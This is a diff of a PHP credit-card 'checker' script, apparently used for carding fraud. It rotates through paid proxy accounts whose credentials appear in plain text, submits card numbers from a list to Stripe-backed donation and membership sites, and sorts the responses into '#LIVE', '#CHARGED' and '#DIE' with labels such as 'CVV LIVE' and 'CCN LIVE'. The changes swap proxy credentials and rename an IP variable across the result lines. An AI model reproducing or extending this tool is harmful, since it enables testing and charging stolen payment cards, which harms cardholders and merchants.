@@ -86,9 +86,9 @@ function mod($dividendo,$divisor)
 /////////////===[Proxy]/////////////
 $rp1 = array(
   1 => 'bbdwmqhv-rotate:5z7pm4a88t6r',
-  2 => 'bbdwmqhv-rotate:5z7pm4a88t6r',
+  2 => 'oaicizel-rotate:cropsbilvm0x',
   3 => 'bbdwmqhv-rotate:5z7pm4a88t6r',
-  4 => 'bbdwmqhv-rotate:5z7pm4a88t6r',
+  4 => 'oaicizel-rotate:cropsbilvm0x',
   5 => 'bbdwmqhv-rotate:5z7pm4a88t6r',
     ); 
     $rpt = array_rand($rp1);
@@ -206,19 +206,19 @@ if(strpos($result2, "payment_intent_unexpected_state")) {
 
 
 
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ '.$ip.'</span><br>';
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ '.$ip1.'</span><br>';
 
     }
 
 elseif(strpos($result2, "succeeded")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip.' </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "Your card has insufficient funds.")) {
 
-    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅checker '.$ip.'  </span><br>';
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅checker '.$ip1.'  </span><br>';
     exit;
     }
 
@@ -226,34 +226,34 @@ elseif(strpos($result2, "Your card has insufficient funds.")) {
 
 elseif(strpos($result2, "incorrect_zip")) {
 
-    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅checker '.$ip.'  </span><br>';
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅checker '.$ip1.'  </span><br>';
     exit;
     }
     
     elseif(strpos($result2, "Your card has insufficient funds.")) {
 
-    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅checker '.$ip.'  </span><br>';
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅checker '.$ip1.'  </span><br>';
     exit;
     }
 
 elseif(strpos($result2, 'security code is incorrect.')) {
 
-    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅checker '.$ip.'  </span><br>';
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅checker '.$ip1.'  </span><br>';
     exit;
     }
     elseif(strpos($result2, 'security code is invalid.')) {
 
-        echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅checker '.$ip.'  </span><br>';
+        echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅checker '.$ip1.'  </span><br>';
         exit;
         }
     elseif(strpos($result2, "Security code is incorrect")) {
 
-    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅checker '.$ip.'  </span><br>';
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅checker '.$ip1.'  </span><br>';
     }
     
 elseif(strpos($result2, "transaction_not_allowed")) {
 
-    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  CVV LIVE ✅checker '.$ip.'   </span><br>';
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  CVV LIVE ✅checker '.$ip1.'   </span><br>';
     exit;
     }
     
@@ -261,110 +261,110 @@ elseif(strpos($result2, "transaction_not_allowed")) {
 elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
 
 
-    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ✅checker '.$ip.'   </span><br>';
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ✅checker '.$ip1.'   </span><br>';
     exit;
     }
 elseif(strpos($result2, "generic_decline")) {
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ '.$ip.'</span><br>';
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ '.$ip1.'</span><br>';
     }
 
 elseif(strpos($result2, "do_not_honor")) {
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ '.$ip.'</span><br>';
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ '.$ip1.'</span><br>';
 
 }
 
 
 elseif(strpos($result2, "fraudulent")) {
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ '.$ip.'</span><br>';
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ '.$ip1.'</span><br>';
 
 }
 elseif(strpos($result2, "intent_confirmation_challenge")) {
 
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ '.$ip.'</span><br>';
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ '.$ip1.'</span><br>';
 
     }
 
 
 elseif(strpos($result2, 'Your card was declined.')) {
 
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline '.$ip.'</span><br>';
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline '.$ip1.'</span><br>';
 }
 
 elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {
 
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline '.$ip.'</span><br>';
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline '.$ip1.'</span><br>';
 }
 
 elseif(strpos($result2, '"cvc_check": "pass"')) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅checker '.$ip.'  </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅checker '.$ip1.'  </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "Membership Confirmation")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅checker '.$ip.' </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅checker '.$ip1.' </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "Thank you for your support!")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip.' </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "Thank you for your donation")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip.' </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "/wishlist-member/?reg=")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip.' </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "Thank You For Donation.")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip.' </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "Thank You")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip.' </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "incorrect_cvc")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CCN LIVE ✅checker '.$ip.'   </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CCN LIVE ✅checker '.$ip1.'   </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅checker '.$ip.'  </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅checker '.$ip1.'  </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "Your card does not support this type of purchase.")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅checker '.$ip.'  </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅checker '.$ip1.'  </span><br>';
 exit;
 }
 
 elseif(strpos($result2, "Your card is not supported.")) {
 
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CARD NOT SUPPORTED '.$ip.' </span><br>';
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CARD NOT SUPPORTED '.$ip1.' </span><br>';
 exit;
 }
 
 
 else {
 
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ '.$ip.'</span><br>';
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ '.$ip1.'</span><br>';
 
 }
 
